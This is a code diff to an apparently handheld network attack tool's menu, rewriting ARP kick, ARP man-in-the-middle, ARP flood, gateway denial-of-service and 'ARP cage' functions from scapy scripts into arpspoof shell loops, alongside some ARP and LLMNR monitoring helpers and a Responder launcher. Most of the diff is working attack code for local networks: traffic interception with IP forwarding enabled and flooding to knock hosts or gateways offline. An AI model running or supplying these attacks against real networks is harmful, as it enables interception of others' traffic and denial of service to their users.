@@ -944,55 +944,32 @@ def do_network_scan():
 
 
 def do_arp_kick(target_ip):
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
     _run_attack("ARP KICK", [
-        "python3","-c",
-        f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    print(f'Kicking {{tgt}} via {{iface}}')
-    for i in range(600):
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(5)
-except Exception as e:
-    print(f'Error: {{e}}')
-"""
+        "bash", "-c",
+        f"echo 'Kicking {target_ip} via {iface}'"
+        f"; while true; do"
+        f"  arpspoof -i {iface} -t {target_ip} {gw} 2>&1 | head -2"
+        f"  ; sleep 2"
+        f"; done"
     ])
-
-
 def do_mitm(target_ip):
+    iface = ktox_state["iface"]
+    gw    = ktox_state["gateway"]
     _run_attack("ARP MITM", [
-        "python3","-c",
-        f"""
-import sys,os,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{ktox_state["gateway"]}'; tgt='{target_ip}'
-os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else None
-    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
-    gw_mac=ans2[0][1][Ether].src if ans2 else None
-    if not tgt_mac or not gw_mac: print('Cannot resolve MACs'); sys.exit(1)
-    print(f'MITM: {{tgt}} <-> {{gw}}')
-    while True:
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(3)
-except Exception as e:
-    print(f'Error: {{e}}')
-finally:
-    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-    print('IP forwarding disabled')
-"""
+        "bash", "-c",
+        f"echo 1 > /proc/sys/net/ipv4/ip_forward"
+        f"; echo 'MITM: {target_ip} <-> {gw}'"
+        f"; arpspoof -i {iface} -t {target_ip} {gw} 2>/dev/null &"
+        f"; PID1=$!"
+        f"; arpspoof -i {iface} -t {gw} {target_ip} 2>/dev/null &"
+        f"; PID2=$!"
+        f"; echo 'Forwarding ON — KEY3 to stop'"
+        f"; wait $PID1 $PID2"
+        f"; echo 0 > /proc/sys/net/ipv4/ip_forward"
+        f"; echo 'Done'"
     ])
-
-
 def do_wifi_monitor_on():
     Dialog_info("Enabling\nmonitor mode…", wait=False, timeout=1)
     _run(["airmon-ng","check","kill"], timeout=10)
@@ -1036,46 +1013,45 @@ def do_wifi_scan():
 
 
 def do_arp_watch():
-    _run_attack("ARP WATCH",[
-        "python3","-c",
-        "from scapy.all import sniff,ARP\n"
-        "known={}\n"
+    _run_attack("ARP WATCH", [
+        "python3", "-c",
+        "from scapy.all import sniff, ARP\n"  # scapy OK here — runs in subprocess after boot
+        "known = {}\n"
         "def h(p):\n"
-        "  if ARP in p and p[ARP].op==2:\n"
-        "    ip=p[ARP].psrc;mac=p[ARP].hwsrc\n"
-        "    if ip in known and known[ip]!=mac:\n"
-        "      print(f'! CONFLICT {ip} {known[ip][:11]} -> {mac[:11]}')\n"
-        "    known[ip]=mac\n"
-        "sniff(prn=h,filter='arp',store=0)"
+        "    if ARP in p and p[ARP].op == 2:\n"
+        "        ip = p[ARP].psrc; mac = p[ARP].hwsrc\n"
+        "        if ip in known and known[ip] != mac:\n"
+        "            print(f'! POISON {ip}  {known[ip][:11]} -> {mac[:11]}')\n"
+        "        known[ip] = mac\n"
+        "print('Watching ARP... KEY3 to stop')\n"
+        "sniff(prn=h, filter='arp', store=0)\n"
     ])
-
-
 def do_arp_diff():
-    _run_attack("ARP DIFF",[
-        "python3","-c",
-        "import subprocess,time\n"
-        "def arp():\n"
-        "  out=subprocess.check_output(['arp','-an'],text=True)\n"
-        "  t={}\n"
-        "  for line in out.splitlines():\n"
-        "    p=line.split()\n"
-        "    try:\n"
-        "      ip=p[1].strip('()');mac=p[3]\n"
-        "      if mac!='<incomplete>':t[ip]=mac\n"
-        "    except:pass\n"
-        "  return t\n"
-        "base=arp()\n"
+    _run_attack("ARP DIFF", [
+        "python3", "-c",
+        "import subprocess, time\n"
+        "def snap():\n"
+        "    out = subprocess.check_output(['arp','-an'], text=True, timeout=5)\n"
+        "    t = {}\n"
+        "    for ln in out.splitlines():\n"
+        "        p = ln.split()\n"
+        "        try:\n"
+        "            ip = p[1].strip('()'); mac = p[3]\n"
+        "            if mac != '<incomplete>': t[ip] = mac\n"
+        "        except: pass\n"
+        "    return t\n"
+        "base = snap()\n"
         "print(f'Baseline: {len(base)} entries')\n"
         "while True:\n"
-        "  time.sleep(5);cur=arp()\n"
-        "  for ip,mac in cur.items():\n"
-        "    if ip in base and base[ip]!=mac:\n"
-        "      print(f'! CHANGE {ip} {base[ip][:11]} -> {mac[:11]}');base[ip]=mac\n"
-        "    elif ip not in base:\n"
-        "      print(f'+ NEW {ip} {mac}');base[ip]=mac"
+        "    time.sleep(5); cur = snap()\n"
+        "    for ip, mac in cur.items():\n"
+        "        if ip in base and base[ip] != mac:\n"
+        "            print(f'! CHANGE {ip}  {base[ip][:11]} -> {mac[:11]}')\n"
+        "            base[ip] = mac\n"
+        "        elif ip not in base:\n"
+        "            print(f'+ NEW {ip}  {mac}')\n"
+        "            base[ip] = mac\n"
     ])
-
-
 def do_rogue_detect():
     gw  = ktox_state["gateway"]
     net = gw.rsplit(".",1)[0]+".0/24" if gw else "192.168.1.0/24"
@@ -1099,21 +1075,12 @@ while True:
 
 
 def do_llmnr_detect():
-    _run_attack("LLMNR DETECT",[
-        "python3","-c",
-        "from scapy.all import sniff,UDP,DNS,IP\n"
-        "def h(p):\n"
-        "  if UDP in p and p[UDP].dport==5355:\n"
-        "    if DNS in p:\n"
-        "      src=p[IP].src if IP in p else '?'\n"
-        "      if p[DNS].qr==1: print(f'! RESPONSE {src} possible poison')\n"
-        "      else:\n"
-        "        qn=p[DNS].qd.qname.decode(errors='ignore') if p[DNS].qd else '?'\n"
-        "        print(f'~ QUERY {src} {qn}')\n"
-        "sniff(filter='udp and port 5355',prn=h,store=0)"
+    _run_attack("LLMNR DETECT", [
+        "bash", "-c",
+        "echo 'Monitoring LLMNR port 5355...'"
+        "; tcpdump -l -n udp port 5355 2>/dev/null"
+        " | while IFS= read -r ln; do echo \"~ $ln\"; done"
     ])
-
-
 def do_responder_on():
     iface = ktox_state["iface"]
     rpy   = f"{INSTALL_PATH}Responder/Responder.py"
@@ -1534,81 +1501,57 @@ class KTOxMenu:
             do_mitm(tgt)
 
     def _arp_flood(self):
-        tgt = _pick_host()
+        tgt   = _pick_host()
+        iface = ktox_state["iface"]
+        gw    = ktox_state["gateway"]
         if tgt and YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}?"):
             _run_attack("ARP FLOOD", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; tgt='{tgt}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    print(f'Flooding {{tgt}}')
-    while True:
-        for fake_ip in ['10.0.0.{{}}'.format(i) for i in range(1,254)]:
-            sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake_ip,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(0.2)
-except Exception as e:
-    print(f'Error: {{e}}')
-"""
+                "bash", "-c",
+                f"echo 'ARP flooding {tgt}'"
+                f"; n=1"
+                f"; while true; do"
+                f"  arpspoof -i {iface} -t {tgt} 10.0.0.$n 2>/dev/null &"
+                f"  P=$!; sleep 0.1; kill $P 2>/dev/null"
+                f"  ; n=$((n % 253 + 1))"
+                f"  ; [ $((n % 25)) -eq 0 ] && echo \"Sent $n flood pkts\""
+                f"; done"
             ])
-
     def _gw_dos(self):
-        gw = ktox_state["gateway"]
+        gw    = ktox_state["gateway"]
+        iface = ktox_state["iface"]
         if not gw:
             Dialog_info("No gateway!", wait=True)
             return
         if YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}?"):
             _run_attack("GW DoS", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{gw}'
-iface_mac=get_if_hwaddr(iface)
-print(f'DoS on {{gw}}')
-while True:
-    for fake in ['192.168.0.{{}}'.format(i) for i in range(1,255)]:
-        sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(op=2,pdst=gw,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
-    time.sleep(0.05)
-"""
+                "bash", "-c",
+                f"echo 'DoS on {gw}'"
+                f"; n=1"
+                f"; while true; do"
+                f"  arpspoof -i {iface} -t {gw} 10.33.0.$n 2>/dev/null &"
+                f"  P=$!; sleep 0.05; kill $P 2>/dev/null"
+                f"  ; n=$((n % 253 + 1))"
+                f"  ; [ $((n % 50)) -eq 0 ] && echo \"Sent $n pkts\""
+                f"; done"
             ])
-
     def _arp_cage(self):
-        tgt = _pick_host()
-        gw  = ktox_state["gateway"]
+        tgt   = _pick_host()
+        gw    = ktox_state["gateway"]
+        iface = ktox_state["iface"]
         if not tgt or not gw:
             return
         if YNDialog("ARP CAGE", y="Yes", n="No", b=f"Cage {tgt}?"):
             _run_attack("ARP CAGE", [
-                "python3","-c",
-                f"""
-import sys,time; sys.path.insert(0,'{KTOX_DIR}')
-from scapy.all import *
-iface='{ktox_state["iface"]}'; gw='{gw}'; tgt='{tgt}'
-try:
-    iface_mac=get_if_hwaddr(iface)
-    ans,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=tgt),timeout=2,verbose=0,iface=iface)
-    tgt_mac=ans[0][1][Ether].src if ans else 'ff:ff:ff:ff:ff:ff'
-    ans2,_=srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=gw),timeout=2,verbose=0,iface=iface)
-    gw_mac=ans2[0][1][Ether].src if ans2 else 'ff:ff:ff:ff:ff:ff'
-    fake='10.66.66.66'
-    print(f'Caging {{tgt}}')
-    while True:
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=gw,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=gw_mac)/ARP(op=2,pdst=gw,hwdst=gw_mac,psrc=tgt,hwsrc=iface_mac),iface=iface,verbose=0)
-        sendp(Ether(dst=tgt_mac)/ARP(op=2,pdst=tgt,hwdst=tgt_mac,psrc=fake,hwsrc=iface_mac),iface=iface,verbose=0)
-        time.sleep(3)
-except Exception as e:
-    print(f'Error: {{e}}')
-finally:
-    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
-"""
+                "bash", "-c",
+                f"echo 'Caging {tgt}'"
+                f"; arpspoof -i {iface} -t {tgt} {gw} 2>/dev/null &"
+                f"; PID1=$!"
+                f"; arpspoof -i {iface} -t {gw} {tgt} 2>/dev/null &"
+                f"; PID2=$!"
+                f"; echo 'Cage ACTIVE — KEY3 to release'"
+                f"; wait $PID1 $PID2"
+                f"; echo 'Cage released'"
             ])
-
     def _ntlm(self):
         self.navigate("resp")
 
